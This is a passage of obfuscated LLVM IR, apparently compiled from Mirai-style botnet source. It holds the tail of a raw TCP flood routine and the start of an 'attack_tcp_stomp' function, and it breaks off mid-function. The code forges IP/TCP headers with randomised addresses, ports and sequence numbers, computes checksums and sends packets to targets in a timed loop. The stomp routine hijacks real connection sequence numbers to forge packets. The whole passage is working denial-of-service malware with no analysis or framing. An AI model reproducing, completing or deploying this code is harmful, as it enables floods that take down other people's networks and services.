  %529 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %530 = load i32, i32* %11, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 1
  %534 = load i32, i32* %533, align 4
  %535 = call i32 @ntohl(i32 %534) #7
  %536 = call i32 @rand_next()
  %537 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %538 = load i32, i32* %11, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i64 %539
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %540, i32 0, i32 2
  %542 = load i8, i8* %541, align 4
  %543 = zext i8 %542 to i32
  %544 = lshr i32 %536, %543
  %545 = add i32 %535, -1521330720
  %546 = add i32 %545, %544
  %547 = sub i32 %546, -1521330720
  %548 = add i32 %535, %544
  %549 = call i32 @htonl(i32 %547) #7
  %550 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %551 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %550, i32 0, i32 9
  store i32 %549, i32* %551, align 4
  br label %552

; <label>:552:                                    ; preds = %528, %506
  %553 = load i32, i32* %30, align 4
  %554 = icmp eq i32 %553, -1
  br i1 %554, label %555, label %559

; <label>:555:                                    ; preds = %552
  %556 = call i32 @rand_next()
  %557 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 8
  store i32 %556, i32* %558, align 4
  br label %559

; <label>:559:                                    ; preds = %555, %552
  %560 = load i16, i16* %15, align 2
  %561 = zext i16 %560 to i32
  %562 = icmp eq i32 %561, 65535
  br i1 %562, label %563, label %576

; <label>:563:                                    ; preds = %559
  %564 = call i32 @rand_next()
  %565 = xor i32 %564, -1
  %566 = xor i32 65535, -1
  %567 = xor i32 1835503332, -1
  %568 = or i32 %565, %566
  %569 = or i32 1835503332, %567
  %570 = xor i32 %568, -1
  %571 = and i32 %570, %569
  %572 = and i32 %564, 65535
  %573 = trunc i32 %571 to i16
  %574 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 3
  store i16 %573, i16* %575, align 4
  br label %576

; <label>:576:                                    ; preds = %563, %559
  %577 = load i16, i16* %18, align 2
  %578 = zext i16 %577 to i32
  %579 = icmp eq i32 %578, 65535
  br i1 %579, label %580, label %593

; <label>:580:                                    ; preds = %576
  %581 = call i32 @rand_next()
  %582 = xor i32 %581, -1
  %583 = xor i32 65535, -1
  %584 = xor i32 -879338102, -1
  %585 = or i32 %582, %583
  %586 = or i32 -879338102, %584
  %587 = xor i32 %585, -1
  %588 = and i32 %587, %586
  %589 = and i32 %581, 65535
  %590 = trunc i32 %588 to i16
  %591 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 0
  store i16 %590, i16* %592, align 4
  br label %593

; <label>:593:                                    ; preds = %580, %576
  %594 = load i16, i16* %19, align 2
  %595 = zext i16 %594 to i32
  %596 = icmp eq i32 %595, 65535
  br i1 %596, label %597, label %606

; <label>:597:                                    ; preds = %593
  %598 = call i32 @rand_next()
  %599 = xor i32 65535, -1
  %600 = xor i32 %598, %599
  %601 = and i32 %600, %598
  %602 = and i32 %598, 65535
  %603 = trunc i32 %601 to i16
  %604 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 1
  store i16 %603, i16* %605, align 2
  br label %606

; <label>:606:                                    ; preds = %597, %593
  %607 = load i32, i32* %20, align 4
  %608 = icmp eq i32 %607, 65535
  br i1 %608, label %609, label %613

; <label>:609:                                    ; preds = %606
  %610 = call i32 @rand_next()
  %611 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 2
  store i32 %610, i32* %612, align 4
  br label %613

; <label>:613:                                    ; preds = %609, %606
  %614 = load i32, i32* %21, align 4
  %615 = icmp eq i32 %614, 65535
  br i1 %615, label %616, label %620

; <label>:616:                                    ; preds = %613
  %617 = call i32 @rand_next()
  %618 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 3
  store i32 %617, i32* %619, align 4
  br label %620

; <label>:620:                                    ; preds = %616, %613
  %621 = load i8, i8* %29, align 1
  %622 = icmp ne i8 %621, 0
  br i1 %622, label %623, label %630

; <label>:623:                                    ; preds = %620
  %624 = load i8*, i8** %38, align 8
  %625 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %624, i32 %625)
  %626 = load i8*, i8** %38, align 8
  %627 = load i32, i32* %28, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds i8, i8* %626, i64 %628
  store i8 0, i8* %629, align 1
  br label %630

; <label>:630:                                    ; preds = %623, %620
  %631 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %632 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %631, i32 0, i32 7
  store i16 0, i16* %632, align 2
  %633 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %634 = bitcast %struct.iphdr* %633 to i16*
  %635 = call zeroext i16 @checksum_generic(i16* %634, i32 20)
  %636 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %637 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %636, i32 0, i32 7
  store i16 %635, i16* %637, align 2
  %638 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %639 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %638, i32 0, i32 6
  store i16 0, i16* %639, align 4
  %640 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %641 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %642 = bitcast %struct.tcphdr* %641 to i8*
  %643 = load i32, i32* %28, align 4
  %644 = sext i32 %643 to i64
  %645 = sub i64 20, -5909620127080588233
  %646 = add i64 %645, %644
  %647 = add i64 %646, -5909620127080588233
  %648 = add i64 20, %644
  %649 = trunc i64 %647 to i16
  %650 = call zeroext i16 @htons(i16 zeroext %649) #7
  %651 = load i32, i32* %28, align 4
  %652 = sext i32 %651 to i64
  %653 = sub i64 20, -8237971454849160759
  %654 = add i64 %653, %652
  %655 = add i64 %654, -8237971454849160759
  %656 = add i64 20, %652
  %657 = trunc i64 %655 to i32
  %658 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %640, i8* %642, i16 zeroext %650, i32 %657)
  %659 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %660 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %659, i32 0, i32 6
  store i16 %658, i16* %660, align 4
  %661 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 1
  %663 = load i16, i16* %662, align 2
  %664 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %665 = load i32, i32* %11, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %664, i64 %666
  %668 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %667, i32 0, i32 0
  %669 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %668, i32 0, i32 1
  store i16 %663, i16* %669, align 2
  %670 = load i32, i32* %12, align 4
  %671 = load i8*, i8** %35, align 8
  %672 = load i32, i32* %28, align 4
  %673 = sext i32 %672 to i64
  %674 = sub i64 40, -3423345316124115503
  %675 = add i64 %674, %673
  %676 = add i64 %675, -3423345316124115503
  %677 = add i64 40, %673
  %678 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %679 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %680 = load i32, i32* %11, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %679, i64 %681
  %683 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %682, i32 0, i32 0
  %684 = bitcast %struct.sockaddr_in* %683 to %struct.sockaddr*
  store %struct.sockaddr* %684, %struct.sockaddr** %678, align 8
  %685 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %686 = load %struct.sockaddr*, %struct.sockaddr** %685, align 8
  %687 = call i64 @sendto(i32 %670, i8* %671, i64 %676, i32 16384, %struct.sockaddr* %686, i32 16)
  br label %688

; <label>:688:                                    ; preds = %630
  %689 = load i32, i32* %11, align 4
  %690 = sub i32 0, 1
  %691 = sub i32 %689, %690
  %692 = add nsw i32 %689, 1
  store i32 %691, i32* %11, align 4
  br label %501

; <label>:693:                                    ; preds = %501
  %694 = call i64 @time(i64* null) #6
  %695 = load i32, i32* %31, align 4
  %696 = sext i32 %695 to i64
  %697 = icmp sgt i64 %694, %696
  br i1 %697, label %698, label %699

; <label>:698:                                    ; preds = %693
  br label %700

; <label>:699:                                    ; preds = %693
  br label %500

; <label>:700:                                    ; preds = %698, %126, %120
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = sub i64 0, %108
  %110 = sub i64 %106, %109
  %111 = add nsw i64 %106, %108
  %112 = trunc i64 %110 to i32
  store i32 %112, i32* %28, align 4
  %113 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %113, i32* %12, align 4
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %5
  br label %907

; <label>:116:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %117 = load i32, i32* %12, align 4
  %118 = bitcast i32* %11 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %124

; <label>:121:                                    ; preds = %116
  %122 = load i32, i32* %12, align 4
  %123 = call i32 @close(i32 %122)
  br label %907

; <label>:124:                                    ; preds = %116
  store i32 0, i32* %11, align 4
  br label %125

; <label>:125:                                    ; preds = %759, %124
  %126 = load i32, i32* %11, align 4
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %126, %128
  br i1 %129, label %130, label %764

; <label>:130:                                    ; preds = %125
  store i32 0, i32* %29, align 4
  br label %131

; <label>:131:                                    ; preds = %754, %740, %130
  %132 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %132, i32* %29, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %131
  br label %759

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* %29, align 4
  %137 = load i32, i32* %29, align 4
  %138 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 3, i32 0)
  %139 = and i32 %138, 2048
  %140 = xor i32 %138, 2048
  %141 = or i32 %139, %140
  %142 = or i32 %138, 2048
  %143 = call i32 (i32, i32, ...) @fcntl(i32 %136, i32 4, i32 %141)
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %144, align 4
  %145 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 2
  %150 = load i8, i8* %149, align 4
  %151 = zext i8 %150 to i32
  %152 = icmp slt i32 %151, 32
  br i1 %152, label %153, label %177

; <label>:153:                                    ; preds = %135
  %154 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = call i32 @ntohl(i32 %159) #7
  %161 = call i32 @rand_next()
  %162 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 2
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  %169 = lshr i32 %161, %168
  %170 = add i32 %160, -869612297
  %171 = add i32 %170, %169
  %172 = sub i32 %171, -869612297
  %173 = add i32 %160, %169
  %174 = call i32 @htonl(i32 %172) #7
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %176 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %175, i32 0, i32 0
  store i32 %174, i32* %176, align 4
  br label %186

; <label>:177:                                    ; preds = %135
  %178 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %179 = load i32, i32* %11, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i32 %183, i32* %185, align 4
  br label %186

; <label>:186:                                    ; preds = %177, %153
  %187 = load i16, i16* %19, align 2
  %188 = zext i16 %187 to i32
  %189 = icmp eq i32 %188, 65535
  br i1 %189, label %190, label %202

; <label>:190:                                    ; preds = %186
  %191 = call i32 @rand_next()
  %192 = xor i32 %191, -1
  %193 = xor i32 65535, -1
  %194 = xor i32 1431214577, -1
  %195 = or i32 %192, %193
  %196 = or i32 1431214577, %194
  %197 = xor i32 %195, -1
  %198 = and i32 %197, %196
  %199 = and i32 %191, 65535
  %200 = trunc i32 %198 to i16
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %200, i16* %201, align 2
  br label %206

; <label>:202:                                    ; preds = %186
  %203 = load i16, i16* %19, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %204, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %190
  %207 = load i32, i32* %29, align 4
  %208 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %209 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %209, %struct.sockaddr** %208, align 8
  %210 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %211 = load %struct.sockaddr*, %struct.sockaddr** %210, align 8
  %212 = call i32 @connect(i32 %207, %struct.sockaddr* %211, i32 16)
  %213 = call i64 @time(i64* null) #6
  store i64 %213, i64* %34, align 8
  br label %214

; <label>:214:                                    ; preds = %757, %206
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %215 = load i32, i32* %12, align 4
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %217 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %218 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %218, %struct.sockaddr** %217, align 8
  %219 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %220 = load %struct.sockaddr*, %struct.sockaddr** %219, align 8
  %221 = call i64 @recvfrom(i32 %215, i8* %216, i64 256, i32 16384, %struct.sockaddr* %220, i32* %32)
  %222 = trunc i64 %221 to i32
  store i32 %222, i32* %36, align 4
  %223 = load i32, i32* %36, align 4
  %224 = icmp eq i32 %223, -1
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %214
  br label %907

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %228 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 4
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %231 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 4
  %233 = icmp eq i32 %229, %232
  br i1 %233, label %234, label %746

; <label>:234:                                    ; preds = %226
  %235 = load i32, i32* %36, align 4
  %236 = sext i32 %235 to i64
  %237 = icmp ugt i64 %236, 40
  br i1 %237, label %238, label %746

; <label>:238:                                    ; preds = %234
  %239 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %240 = getelementptr inbounds i8, i8* %239, i64 20
  %241 = bitcast i8* %240 to %struct.tcphdr*
  store %struct.tcphdr* %241, %struct.tcphdr** %38, align 8
  %242 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 0
  %244 = load i16, i16* %243, align 4
  %245 = zext i16 %244 to i32
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %247 = load i16, i16* %246, align 2
  %248 = zext i16 %247 to i32
  %249 = icmp eq i32 %245, %248
  br i1 %249, label %250, label %745

; <label>:250:                                    ; preds = %238
  %251 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = lshr i16 %253, 9
  %255 = xor i16 %254, -1
  %256 = xor i16 1, -1
  %257 = xor i16 -15746, -1
  %258 = or i16 %255, %256
  %259 = or i16 -15746, %257
  %260 = xor i16 %258, -1
  %261 = and i16 %260, %259
  %262 = and i16 %254, 1
  %263 = zext i16 %261 to i32
  %264 = icmp ne i32 %263, 0
  br i1 %264, label %265, label %710

; <label>:265:                                    ; preds = %250
  %266 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = lshr i16 %268, 12
  %270 = xor i16 1, -1
  %271 = xor i16 %269, %270
  %272 = and i16 %271, %269
  %273 = and i16 %269, 1
  %274 = zext i16 %272 to i32
  %275 = icmp ne i32 %274, 0
  br i1 %275, label %276, label %710

; <label>:276:                                    ; preds = %265
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %278 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 4
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %281 = load i32, i32* %11, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 0
  store i32 %279, i32* %284, align 4
  %285 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 2
  %287 = load i32, i32* %286, align 4
  %288 = call i32 @ntohl(i32 %287) #7
  %289 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %290 = load i32, i32* %11, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %289, i64 %291
  %293 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i32 0, i32 1
  store i32 %288, i32* %293, align 4
  %294 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 3
  %296 = load i32, i32* %295, align 4
  %297 = call i32 @ntohl(i32 %296) #7
  %298 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %299 = load i32, i32* %11, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %298, i64 %300
  %302 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %301, i32 0, i32 2
  store i32 %297, i32* %302, align 4
  %303 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 1
  %305 = load i16, i16* %304, align 2
  %306 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %307 = load i32, i32* %11, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %309, i32 0, i32 3
  store i16 %305, i16* %310, align 4
  %311 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %312 = load i16, i16* %311, align 2
  %313 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %314 = load i32, i32* %11, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %316, i32 0, i32 4
  store i16 %312, i16* %317, align 2
  %318 = load i32, i32* %26, align 4
  %319 = sext i32 %318 to i64
  %320 = sub i64 40, -4009838064985544607
  %321 = add i64 %320, %319
  %322 = add i64 %321, -4009838064985544607
  %323 = add i64 40, %319
  %324 = call noalias i8* @malloc(i64 %322) #6
  %325 = load i8**, i8*** %14, align 8
  %326 = load i32, i32* %11, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8*, i8** %325, i64 %327
  store i8* %324, i8** %328, align 8
  %329 = load i8**, i8*** %14, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8*, i8** %329, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %39, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.tcphdr*
  store %struct.tcphdr* %337, %struct.tcphdr** %40, align 8
  %338 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i64 1
  %340 = bitcast %struct.tcphdr* %339 to i8*
  store i8* %340, i8** %41, align 8
  %341 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %342 = bitcast %struct.iphdr* %341 to i8*
  %343 = load i8, i8* %342, align 4
  %344 = xor i8 %343, -1
  %345 = xor i8 15, -1
